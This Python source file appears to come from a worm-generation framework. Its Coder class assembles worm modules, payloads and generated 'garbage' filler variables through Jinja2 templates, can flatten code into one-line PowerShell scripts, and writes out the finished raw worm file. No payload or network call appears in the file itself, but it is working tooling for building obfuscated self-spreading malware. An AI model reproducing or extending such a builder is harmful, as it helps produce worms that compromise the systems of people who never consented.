import os
import base64
from typing import Union
from jinja2 import Template

from .tools.payloader import Payloader
from .tools.starter import Starter
from .tools.shadow import Shadow
from .tools.garbage_man_var import GarbageMan

class CoderTools:
    def __init__(self, coder: object):
        self.coder = coder
        self.msg = self.coder.msg
    
    def powershell_script(self, code: str) -> str:
        code = code.split("\n")
        script = ""
        for line in code:
            if line.strip() == "\n" or line.strip() == "":
                continue
            script += f"{line}; "
        return script


class Coder:
    def __init__(self, queen: object, worm_builder: object):
        self.queen = queen
        self.msg = self.queen.msg
        self.WB = worm_builder
        self.dir_out = self.queen.dir_hive_out
        self.raw_worm_dir_name = None
        self.raw_worm_file_path = None
        self.global_var = {}
        self.payloader = Payloader(self.queen, self)
        self.starter = Starter(self)
        self.shadow = Shadow(self)
        self.garbage_man = GarbageMan(self)
        self.tools = CoderTools(self)
        
 
    @property
    def var(self) -> dict:
        return self._variables()
    
    @property
    def globalVar(self) -> dict:
        gv = self.global_var.copy()
        gv.update(self.WB.globalVar)
        gv.update(self.WB.raw_worm.process.options)
        return gv
    
    @property
    def imports(self) -> list:
        return self._imports()
    
    @property
    def icon(self) -> Union[str, None]:
        return self.WB.icon
    
    
    def _variables(self) -> dict:
        var = {}
        var["MODULES"] = self.prepare_mod_list()
        var["WORM_NAME"] = self.WB.name
        var["_MODULES"] = self.imports
        for name, var_obj in self.WB.var.items():
            var[name] = var_obj.value
        for name, pay in self.WB.raw_worm.payloads.items():
            opt = pay.options
            var[name] = self.payloader.prepare(pay, var, name, opt)
        for name in self.WB.raw_worm.reqPayload.keys():
            if self.WB.raw_worm.master_worm.lang == "asm":
                var[name] = ""
            else:
                var[name] = "''"
        for name, food in self.WB.raw_worm.reqFood.items():
            var[name] = food.value
        for name, gar_v in self.WB.raw_worm.garbageVar.items():
            var[name] = self.garbage_man.generate(gar_v)
        return var
    
    def prepare_mod_list(self) -> str:
        mods = []
        for mod in self.WB.raw_worm.modules.values():
            if mod.subTypes == "loader":
                continue
            mods.append(mod.name)
        out = "{"
        for mod in mods:
            out += f"'{mod}':{mod}, "
        out += "}"
        return out
    
    def return_code(self, code: Union[str, object], return_imports: bool = False) -> str:
        if isinstance(code, str):
            raw = code
        else:
            raw = code.raw_code
        fcode = []
        for line in raw.split("\n"):
            if line.startswith("import") or line.startswith("from"):
                if return_imports:
                    fcode.append(line)
                else:
                    continue
            else:
                fcode.append(line)
        return "\n".join(fcode)
    
    def return_imports(self, code: Union[str, object], use_return_imports_FLAG: bool = False) -> list:
        if isinstance(code, str):
            raw = code
            flag = False
        else:
            raw = code.raw_code
            if use_return_imports_FLAG:
                flag = code.import_FLAG
            else:
                flag = False
        imp = []
        if flag:
            return imp
        for line in raw.split("\n"):
            if line.startswith("import") or line.startswith("from"):
                imp.append(line)
        return imp
    
    def render_single_str(self, code: str, var: dict = {}) -> str:
        code = Template(code)
        code = code.render(var)
        return code
    

    def format_code(self, code: str, coder_opt: dict) -> str:
        format_code = coder_opt.get("FORMAT")
        if format_code:
            match format_code:
                case "PS_SCRIPT":
                    code = self.tools.powershell_script(code)
                case _:
                    self.msg("error", f"ERROR: Unknown 'code format' : '{format_code}'")
        return code


    def render_single(self, mod: Union[str, object], var: dict = None) -> str:
        if not var:
            var = self.var
        if isinstance(mod, str):
            raw = self.return_code(mod)
            return raw
        code = self.return_code(mod, mod.import_FLAG)
        if mod.render_FLAG:
            code = Template(code)
            code = code.render(var)
        if len(mod.coderOpt) > 0:
            code = self.format_code(code, mod.coderOpt)
        return code 
        
    
    def raw_code(self, var: dict = None) -> str:
        if not var:
            var = self.var
        codes = []
        for mod in self.WB.raw_worm.modules.values():
            # exclusion loaders
            if mod.subTypes == "loader":
                continue
            codes.append(self.render_single(mod, var))
        for smod in self.WB.raw_worm.support.values():
            codes.append(self.render_single(smod, var))
        codes.append(self.render_single(self.WB.raw_worm.master_worm, var))
        return "\n".join(codes)
    
    def _imports(self) -> list:
        imp = set()
        for mod in self.WB.items:
            if mod.no_extract_FLAG:
                continue
            for i in self.return_imports(mod, use_return_imports_FLAG=False):
                imp.add(i)
        return list(imp)



       
    def save_raw_worm(self, code: str, name: str = None, file_ext: str = ".py") -> None:
        if not name:
            name = self.WB.name
        self.raw_worm_dir_name = os.path.join(self.dir_out, name)
        self.raw_worm_file_path = os.path.join(self.raw_worm_dir_name, f"{name}{file_ext}")
        if not self.raw_worm_dir_name:
            os.mkdir(self.raw_worm_dir_name)
        with open(self.raw_worm_file_path, "w") as file:
            file.write(code)
        self.msg("msg", f"Save raw worm: '{name}{file_ext}' successful.")

        
    def code_worm_base(self, var: dict = None, options: dict = {}) -> str:
        if not var:
            var = self.var
        imp_FLAG = options.get("INCLUDE_IMPORTS")
        if imp_FLAG:
            code = "\n".join(self.imports) + self.raw_code(var)
        else:
            code = self.raw_code(var)
        rcode = Template(code)
        rcode = rcode.render(var)
        return rcode
        
        

